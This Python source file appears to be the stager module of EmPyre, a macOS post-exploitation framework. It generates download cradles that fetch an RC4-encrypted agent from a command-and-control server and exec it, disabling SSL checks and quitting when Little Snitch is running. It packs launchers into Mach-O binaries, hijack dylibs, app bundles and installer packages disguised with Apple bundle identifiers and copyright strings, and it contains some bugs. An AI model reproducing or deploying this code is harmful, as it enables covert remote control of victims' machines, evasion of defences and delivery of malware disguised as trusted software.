"""

Stager handling functionality for EmPyre.

"""

import fnmatch
import imp
import http
import helpers
import encryption
import os
import base64
import shutil
import zipfile
import macholib.MachO
import io
import subprocess
import struct

class Stagers:

    def __init__(self, MainMenu, args):

        self.mainMenu = MainMenu

        # pull the database connection object out of the main menu
        self.conn = self.mainMenu.conn

        self.args = args

        # stager module format:
        #     [ ("stager_name", instance) ]
        self.stagers = {}

        # pull out the code install path from the database config
        cur = self.conn.cursor()

        cur.execute("SELECT install_path FROM config")
        self.installPath = cur.fetchone()[0]

        cur.execute("SELECT default_profile FROM config")
        self.userAgent = (cur.fetchone()[0]).split("|")[1]

        cur.close()

        # pull out staging information from the main menu
        self.stage0 = self.mainMenu.stage0
        self.stage1 = self.mainMenu.stage1
        self.stage2 = self.mainMenu.stage2

        self.load_stagers()

    def load_stagers(self):
        """
        Load stagers from the install + "/lib/stagers/*" path
        """

        rootPath = self.installPath + 'lib/stagers/'
        pattern = '*.py'

        for root, dirs, files in os.walk(rootPath):
            for filename in fnmatch.filter(files, pattern):
                filePath = os.path.join(root, filename)

                # extract just the module name from the full path
                stagerName = filePath.split("/lib/stagers/")[-1][0:-3]

                # instantiate the module and save it to the internal cache
                self.stagers[stagerName] = imp.load_source(stagerName, filePath).Stager(self.mainMenu, [])

    def set_stager_option(self, option, value):
        """
        Sets an option for all stagers.
        """

        for name, stager in self.stagers.iteritems():
            for stagerOption, stagerValue in stager.options.iteritems():
                if stagerOption == option:
                    stager.options[option]['Value'] = str(value)

    def generate_stager(self, server, key, profile, encrypt=True, encode=False):
        """
        Generate the Python stager that will perform
        key negotiation with the server and kick off the agent.
        """

        # TODO: implement for Python

        # read in the stager base
        f = open(self.installPath + "/data/agent/stager.py")
        stager = f.read()
        f.close()

        stager = helpers.strip_python_comments(stager)

        # first line of randomized text to change up the ending RC4 string
        randomHeader = "%s='%s'\n" % (helpers.random_string(), helpers.random_string())
        stager = randomHeader + stager

        if server.endswith("/"):
            server = server[0:-1]

        # # patch the server and key information
        stager = stager.replace("REPLACE_SERVER", server)
        stager = stager.replace("REPLACE_STAGING_KEY", key)
        stager = stager.replace("REPLACE_PROFILE", profile)
        stager = stager.replace("index.jsp", self.stage1)
        stager = stager.replace("index.php", self.stage2)

        # # base64 encode the stager and return it
        # if encode:
        #     return ""
        if encrypt:
            # return an encrypted version of the stager ("normal" staging)
            # return encryption.xor_encrypt(stager, key)
            return encryption.rc4(key, stager)
        else:
            # otherwise return the case-randomized stager
            return stager

    def generate_stager_hop(self, server, key, profile, encrypt=True, encode=True):
        """
        Generate the Python stager for hop.php redirectors that
        will perform key negotiation with the server and kick off the agent.
        """

        # read in the stager base
        f = open(self.installPath + "./data/agent/stager_hop.py")
        stager = f.read()
        f.close()

        stager = helpers.strip_python_comments(stager)

        # first line of randomized text to change up the ending RC4 string
        randomHeader = "%s='%s'\n" % (helpers.random_string(), helpers.random_string())
        stager = randomHeader + stager

        # patch the server and key information
        stager = stager.replace("REPLACE_SERVER", server)
        stager = stager.replace("REPLACE_STAGING_KEY", key)
        stager = stager.replace("REPLACE_PROFILE", profile)
        stager = stager.replace("index.jsp", self.stage1)
        stager = stager.replace("index.php", self.stage2)

        # # base64 encode the stager and return it
        # if encode:
        #     return ""
        if encrypt:
            # return an encrypted version of the stager ("normal" staging)
            # return encryption.xor_encrypt(stager, key)
            return encryption.rc4(key, stager)
        else:
            # otherwise return the case-randomized stager
            return stager

    def generate_agent(self, delay, jitter, profile, killDate, workingHours, lostLimit):
        """
        Generate "standard API" functionality, i.e. the actual agent.py that runs.

        This should always be sent over encrypted comms.
        """

        f = open(self.installPath + "./data/agent/agent.py")
        code = f.read()
        f.close()

        # strip out comments and blank lines
        code = helpers.strip_python_comments(code)

        b64DefaultPage = base64.b64encode(http.default_page())

        # patch in the delay, jitter, lost limit, and comms profile
        code = code.replace('delay = 60', 'delay = %s' % (delay))
        code = code.replace('jitter = 0.0', 'jitter = %s' % (jitter))
        code = code.replace('profile = "/admin/get.php,/news.asp,/login/process.jsp|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', 'profile = "%s"' % (profile))
        code = code.replace('lostLimit = 60', 'lostLimit = %s' % (lostLimit))
        code = code.replace('defaultPage = base64.b64decode("")', 'defaultPage = base64.b64decode("%s")' % (b64DefaultPage))

        # patch in the killDate and workingHours if they're specified
        if killDate != "":
            code = code.replace('killDate = ""', 'killDate = "%s"' % (killDate))
        if workingHours != "":
            code = code.replace('workingHours = ""', 'workingHours = "%s"' % (killDate))

        return code

    def generate_launcher_uri(self, server, encode=True, pivotServer="", hop=False):
        """
        Generate a base launcher URI.

        This is used in the management/psinject module.
        """

        if hop:
            # generate the base64 encoded information for the hop translation
            checksum = "?" + helpers.encode_base64(server + "&" + self.stage0)
        else:
            # get a valid staging checksum uri
            checksum = self.stage0

        if pivotServer != "":
            checksum += "?" + helpers.encode_base64(pivotServer)

        if server.count("/") == 2 and not server.endswith("/"):
            server += "/"

        return server + checksum

    def generate_launcher(self, listenerName, encode=True, userAgent="default", littlesnitch='True'):
        """
        Generate the initial Python 'download cradle' with a specified
        c2 server and a valid HTTP checksum.

        listenerName -> a name of a validly registered listener

        userAgent ->    "default" uses the UA from the default profile in the database
                        "none" sets no user agent
                        any other text is used as the user-agent
        """

        # if we don't have a valid listener, return nothing
        if not self.mainMenu.listeners.is_listener_valid(listenerName):
            print helpers.color("[!] Invalid listener: " + listenerName)
            return ""

        # extract the staging information from this specified listener
        (server, stagingKey, pivotServer, hop) = self.mainMenu.listeners.get_stager_config(listenerName)

        # if UA is 'default', use the UA from the default profile in the database
        if userAgent.lower() == "default":
            userAgent = self.userAgent

        # get the launching stage0 URI
        stage0uri = self.generate_launcher_uri(server, encode, pivotServer, hop)

        # adopted from MSF's python meterpreter staging
        #   https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/python/reverse_http.rb

        # first line of randomized text to change up the ending RC4 string
        launcherBase = "%s='%s'\n" % (helpers.random_string(), helpers.random_string())

        if "https" in stage0uri:
            # monkey patch ssl woohooo
            launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"

        launcherBase += "import sys, urllib2;"
        try:
            if littlesnitch.lower() == 'true':
                launcherBase += "import re, subprocess;"
                launcherBase += "cmd = \"ps -ef | grep Little\ Snitch | grep -v grep\"\n"
                launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n"
                launcherBase += "out = ps.stdout.read()\n"
                launcherBase += "ps.stdout.close()\n"
                launcherBase += "if re.search(\"Little Snitch\", out):\n"
                launcherBase += "   sys.exit()\n"
        except Exception as e:
            p = "[!] Error setting LittleSnitch in stagger: " + str(e)
            print helpers.color(p, color="Yellow")

        
        launcherBase += "o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener();"
        launcherBase += "UA='%s';" % (userAgent)
        launcherBase += "o.addheaders=[('User-Agent',UA)];"
        launcherBase += "a=o.open('%s').read();" % (stage0uri)
        launcherBase += "key='%s';" % (stagingKey)
        # RC4 decryption
        launcherBase += "S,j,out=range(256),0,[]\n"
        launcherBase += "for i in range(256):\n"
        launcherBase += "    j=(j+S[i]+ord(key[i%len(key)]))%256\n"
        launcherBase += "    S[i],S[j]=S[j],S[i]\n"
        launcherBase += "i=j=0\n"
        launcherBase += "for char in a:\n"
        launcherBase += "    i=(i+1)%256\n"
        launcherBase += "    j=(j+S[i])%256\n"
        launcherBase += "    S[i],S[j]=S[j],S[i]\n"
        launcherBase += "    out.append(chr(ord(char)^S[(S[i]+S[j])%256]))\n"
        launcherBase += "exec(''.join(out))"

        # base64 encode the stager and return it
        if encode:
            launchEncoded = base64.b64encode(launcherBase)
            # launcher = "python -c \"import sys,base64;exec(base64.b64decode('%s'));\"" %(launchEncoded)
            launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python &" % (launchEncoded)
            return launcher
        else:
            return launcherBase

    def generate_hop_php(self, server, resources):
        """
        Generates a hop.php file with the specified target server
        and resource URIs.
        """

        # read in the hop.php base
        f = open(self.installPath + "/data/misc/hop.php")
        hop = f.read()
        f.close()

        # make sure the server ends with "/"
        if not server.endswith("/"):
            server += "/"

        # patch in the server and resources
        hop = hop.replace("REPLACE_SERVER", server)
        hop = hop.replace("REPLACE_RESOURCES", resources)

        return hop

    def generate_macho(self, launcherCode):

        """
        Generates a macho binary with an embedded python interpreter that runs the launcher code
        """

       

        MH_EXECUTE = 2
        f = open(self.installPath + "/data/misc/machotemplate", 'rb')
        macho = macholib.MachO.MachO(f.name)

        if int(macho.headers[0].header.filetype) != MH_EXECUTE:
            print helpers.color("[!] Macho binary template is not the correct filetype")
            return ""

        cmds = macho.headers[0].commands

        for cmd in cmds:
            count = 0
            if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64:
                count += 1
                if cmd[count].segname.strip('\x00') == '__TEXT' and cmd[count].nsects > 0:
                    count += 1
                    for section in cmd[count]:
                        if section.sectname.strip('\x00') == '__cstring':
                            offset = int(section.offset)
                            placeHolderSz = int(section.size) - 13

        template = f.read()
        f.close()

        if placeHolderSz and offset:

            launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
            patchedMachO = template[:offset]+launcher+template[(offset+len(launcher)):]

            return patchedMachO
        else:
            print helpers.color("[!] Unable to patch MachO binary")

    def generate_dylib(self, launcherCode, arch, hijacker):
        """
        Generates a dylib with an embedded python interpreter and runs launcher code when loaded into an application.
        """
        

        MH_DYLIB = 6
        if hijacker.lower() == 'true':
            if arch == 'x86':
                f = open(self.installPath + "/data/misc/hijackers/template.dylib", "rb")
            else:
                f = open(self.installPath + "/data/misc/hijackers/template64.dylib", "rb")
        else:
            if arch == 'x86':
                f = open(self.installPath + "/data/misc/templateLauncher.dylib", "rb")
            else:
                f = open(self.installPath + "/data/misc/templateLauncher64.dylib", "rb")
        
        macho = macholib.MachO.MachO(f.name)

        if int(macho.headers[0].header.filetype) != MH_DYLIB:
            print helpers.color("[!] Dylib template is not the correct filetype")
            return ""

        cmds = macho.headers[0].commands

        for cmd in cmds:
            count = 0
            if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64 or int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT:
                count += 1
                if cmd[count].segname.strip('\x00') == '__TEXT' and cmd[count].nsects > 0:
                    count += 1
                    for section in cmd[count]:
                        if section.sectname.strip('\x00') == '__cstring':
                            offset = int(section.offset)
                            placeHolderSz = int(section.size) - 52
        template = f.read()
        f.close()

        if placeHolderSz and offset:

            launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
            patchedDylib = template[:offset]+launcher+template[(offset+len(launcher)):]

            return patchedDylib
        else:
            print helpers.color("[!] Unable to patch dylib")

    def generate_dylibHijacker(self, attackerDylib, targetDylib, LegitDylibLocation):

        LC_HEADER_SIZE = 0x8

        def checkPrereqs(attackerDYLIB, targetDYLIB):

            if not os.path.exists(targetDYLIB):

                print helpers.color("[!] Path for legitimate dylib is not valid")
                return False

            attacker = open(attackerDYLIB, 'rb')
            target = open(targetDYLIB, 'rb')
            attackDylib = macholib.MachO.MachO(attacker.name)
            targetDylib = macholib.MachO.MachO(target.name)

            if attackDylib.headers[0].header.cputype != targetDylib.headers[0].header.cputype:
                print helpers.color("[!] Architecture mismatch!")
                return False 

            return True



        def findLoadCommand(fileHandle, targetLoadCommand):
            #print helpers.color("In findLoadCommand function")
            #offset of matches load commands
            matchedOffsets = []

            try:
                macho = macholib.MachO.MachO(fileHandle.name)
                if macho:
                    for machoHeader in macho.headers:
                        fileHandle.seek(machoHeader.offset, io.SEEK_SET)
                        fileHandle.seek(machoHeader.mach_header._size_, io.SEEK_CUR)
                        loadCommands = machoHeader.commands

                        for loadCommand in loadCommands:

                            if targetLoadCommand == loadCommand[0].cmd:
                                matchedOffsets.append(fileHandle.tell())

                            fileHandle.seek(loadCommand[0].cmdsize, io.SEEK_CUR)
            except Exception, e:
                raise e
                matchedOffsets = None

            return matchedOffsets

        def configureVersions(attackerDylib, targetDylib):
            #print helpers.color("In configureVersions function")
            try:
                fileHandle = open(targetDylib, 'rb+')

                versionOffsets = findLoadCommand(fileHandle, macholib.MachO.LC_ID_DYLIB)
                if not versionOffsets or not len(versionOffsets):
                    return False

                fileHandle.seek(versionOffsets[0], io.SEEK_SET)
                fileHandle.seek(LC_HEADER_SIZE+0x8, io.SEEK_CUR)

                #extract current version
                currentVersion = fileHandle.read(4)

                #extract compatibility version
                compatibilityVersion = fileHandle.read(4)

                fileHandle.close()

                fileHandle = open(attackerDYLIB, 'rb+')

                versionOffsets = findLoadCommand(fileHandle, macholib.MachO.LC_ID_DYLIB)

                if not versionOffsets or not len(versionOffsets):
                    return False

                for versionOffset in versionOffsets:

                    fileHandle.seek(versionOffset, io.SEEK_SET)

                    fileHandle.seek(LC_HEADER_SIZE+0x8, io.SEEK_CUR)

                    #set current version
                    fileHandle.write(currentVersion)

                    #set compatability version
                    fileHandle.write(compatibilityVersion)

                fileHandle.close()

            except Exception, e:
                raise e

            return True

        def configureReExport(attackerDylib, targetDylib, LegitDylibLocation):
            
            try:
                fileHandle = open(attackerDylib,'rb+')

                reExportOffsets = findLoadCommand(fileHandle, macholib.MachO.LC_REEXPORT_DYLIB)

                if not reExportOffsets or not len(reExportOffsets):
                    return False

                for reExportOffset in reExportOffsets:

                    fileHandle.seek(reExportOffset, io.SEEK_SET)
                    fileHandle.seek(0x4, io.SEEK_CUR)

                    commandSize = struct.unpack('<L', fileHandle.read(4))[0]
                    pathOffset = struct.unpack('<L', fileHandle.read(4))[0]

                    fileHandle.seek(reExportOffset + pathOffset, io.SEEK_SET)
                    pathSize = commandSize - (fileHandle.tell() - reExportOffset)

                    data = LegitDylibLocation + '\\0' * (pathSize - len(LegitDylibLocation))
                    fileHandle.write(data)
                    fileHandle.close()

            except Exception, e:
                raise e
                return False

            return True

        def configure(attackerDylib, targetDylib, LegitDylibLocation):
            #print helpers.color("In configure function")
            if not configureVersions(attackerDylib, targetDylib):
                return False

            if not configureReExport(attackerDylib, targetDylib, LegitDylibLocation):
                return False

            return True 

        if not checkPrereqs(attackerDYLIB, targetDYLIB):
            return ""
        if not configure(attackerDylib, targetDylib, LegitDylibLocation):
            return ""

        hijacker = open(attackerDylib,'rb')
        hijackerBytes = hijacker.read()
        return hijackerBytes



    def generate_appbundle(self, launcherCode, Arch, icon, AppName, disarm):

        """
        Generates an application. The embedded executable is a macho binary with the python interpreter.
        """

        

        MH_EXECUTE = 2

        if Arch == 'x64':

            f = open(self.installPath + "/data/misc/apptemplateResources/x64/launcher.app/Contents/MacOS/launcher")
            directory = self.installPath + "/data/misc/apptemplateResources/x64/launcher.app/"
        else:
            f = open(self.installPath + "/data/misc/apptemplateResources/x86/launcher.app/Contents/MacOS/launcher")
            directory = self.installPath + "/data/misc/apptemplateResources/x86/launcher.app/"

        macho = macholib.MachO.MachO(f.name)

        if int(macho.headers[0].header.filetype) != MH_EXECUTE:
            print helpers.color("[!] Macho binary template is not the correct filetype")
            return ""

        cmds = macho.headers[0].commands

        for cmd in cmds:
            count = 0
            if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64 or int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT:
                count += 1
                if cmd[count].segname.strip('\x00') == '__TEXT' and cmd[count].nsects > 0:
                    count += 1
                    for section in cmd[count]:
                        if section.sectname.strip('\x00') == '__cstring':
                            offset = int(section.offset)
                            placeHolderSz = int(section.size) - 52

        template = f.read()
        f.close()

        if placeHolderSz and offset:

            launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
            patchedBinary = template[:offset]+launcher+template[(offset+len(launcher)):]
            if AppName == "":
                AppName = "launcher"

            tmpdir = "/tmp/application/%s.app/" % AppName
            shutil.copytree(directory, tmpdir)
            f = open(tmpdir + "Contents/MacOS/launcher","wb")
            if disarm != True:
                f.write(patchedBinary)
                f.close()
            else:
                t = open(self.installPath+"/data/misc/apptemplateResources/empty/macho",'rb')
                w = t.read()
                f.write(w)
                f.close()
                t.close()

            os.rename(tmpdir + "Contents/MacOS/launcher",tmpdir + "Contents/MacOS/%s" % AppName)
            os.chmod(tmpdir+"Contents/MacOS/%s" % AppName, 0755)

            if icon != '':
                iconfile = os.path.splitext(icon)[0].split('/')[-1]
                shutil.copy2(icon,tmpdir+"Contents/Resources/"+iconfile+".icns")
            else:
                iconfile = icon
            appPlist = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>BuildMachineOSBuild</key>
    <string>15G31</string>
    <key>CFBundleDevelopmentRegion</key>
    <string>en</string>
    <key>CFBundleExecutable</key>
    <string>%s</string>
    <key>CFBundleIconFile</key>
    <string>%s</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.%s</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundleName</key>
    <string>%s</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleSignature</key>
    <string>????</string>
    <key>CFBundleSupportedPlatforms</key>
    <array>
        <string>MacOSX</string>
    </array>
    <key>CFBundleVersion</key>
    <string>1</string>
    <key>DTCompiler</key>
    <string>com.apple.compilers.llvm.clang.1_0</string>
    <key>DTPlatformBuild</key>
    <string>7D1014</string>
    <key>DTPlatformVersion</key>
    <string>GM</string>
    <key>DTSDKBuild</key>
    <string>15E60</string>
    <key>DTSDKName</key>
    <string>macosx10.11</string>
    <key>DTXcode</key>
    <string>0731</string>
    <key>DTXcodeBuild</key>
    <string>7D1014</string>
    <key>LSApplicationCategoryType</key>
    <string>public.app-category.utilities</string>
    <key>LSMinimumSystemVersion</key>
    <string>10.11</string>
    <key>LSUIElement</key>
    <true/>
    <key>NSHumanReadableCopyright</key>
    <string>Copyright 2016 Apple. All rights reserved.</string>
    <key>NSMainNibFile</key>
    <string>MainMenu</string>
    <key>NSPrincipalClass</key>
    <string>NSApplication</string>
</dict>
</plist>
""" % (AppName, iconfile, AppName, AppName)
            f = open(tmpdir+"Contents/Info.plist", "w")
            f.write(appPlist)
            f.close()

            shutil.make_archive("/tmp/launcher", 'zip', "/tmp/application")
            shutil.rmtree('/tmp/application')

            f = open("/tmp/launcher.zip","rb")
            zipbundle = f.read()
            f.close()
            os.remove("/tmp/launcher.zip")
            return zipbundle
        
            
        else:
            print helpers.color("[!] Unable to patch application")


    def generate_pkg(self, launcher, bundleZip, AppName):

        #unzip application bundle zip. Copy everything for the installer pkg to a temporary location
        currDir = os.getcwd()
        os.chdir("/tmp/")
        f = open("app.zip","wb")
        f.write(bundleZip)
        f.close()
        zipf = zipfile.ZipFile('app.zip','r')
        zipf.extractall()
        zipf.close()
        os.remove('app.zip')

        os.system("cp -r "+self.installPath+"/data/misc/pkgbuild/ /tmp/")
        os.chdir("pkgbuild")
        os.system("cp -r ../"+AppName+".app root/Applications")
        os.system("chmod +x root/Applications/")
        os.system("( cd root && find . | cpio -o --format odc --owner 0:80 | gzip -c ) > expand/Payload")
        os.system("chmod +x expand/Payload")
        s = open('scripts/postinstall','r+')
        script = s.read()
        script = script.replace('LAUNCHER',launcher)
        s.seek(0)
        s.write(script)
        s.close()
        os.system("( cd scripts && find . | cpio -o --format odc --owner 0:80 | gzip -c ) > expand/Scripts")
        os.system("chmod +x expand/Scripts")
        numFiles = subprocess.check_output("find root | wc -l",shell=True).strip('\n')
        size = subprocess.check_output("du -b -s root",shell=True).split('\t')[0]
        size = int(size) / 1024
        p = open('expand/PackageInfo','w+')
        pkginfo = """<?xml version="1.0" encoding="utf-8" standalone="no"?>
<pkg-info overwrite-permissions="true" relocatable="false" identifier="com.apple.APPNAME" postinstall-action="none" version="1.0" format-version="2" generator-version="InstallCmds-554 (15G31)" install-location="/" auth="root">
    <payload numberOfFiles="KEY1" installKBytes="KEY2"/>
    <bundle path="./APPNAME.app" id="com.apple.APPNAME" CFBundleShortVersionString="1.0" CFBundleVersion="1"/>
    <bundle-version>
        <bundle id="com.apple.APPNAME"/>
    </bundle-version>
    <upgrade-bundle>
        <bundle id="com.apple.APPNAME"/>
    </upgrade-bundle>
    <update-bundle/>
    <atomic-update-bundle/>
    <strict-identifier>
        <bundle id="com.apple.APPNAME"/>
    </strict-identifier>
    <relocate>
        <bundle id="com.apple.APPNAME"/>
    </relocate>
    <scripts>
        <postinstall file="./postinstall"/>
    </scripts>
</pkg-info>
"""
        pkginfo = pkginfo.replace('APPNAME',AppName)
        pkginfo = pkginfo.replace('KEY1',numFiles)
        pkginfo = pkginfo.replace('KEY2',str(size))
        p.write(pkginfo)
        p.close()
        os.system("mkbom -u 0 -g 80 root expand/Bom")
        os.system("chmod +x expand/Bom")
        os.system("chmod -R 755 expand/")
        os.system('( cd expand && xar --compression none -cf "../launcher.pkg" * )')
        f = open('launcher.pkg','rb')
        package = f.read()
        os.chdir("/tmp/")
        shutil.rmtree('pkgbuild')
        shutil.rmtree(AppName+".app")
        return package

    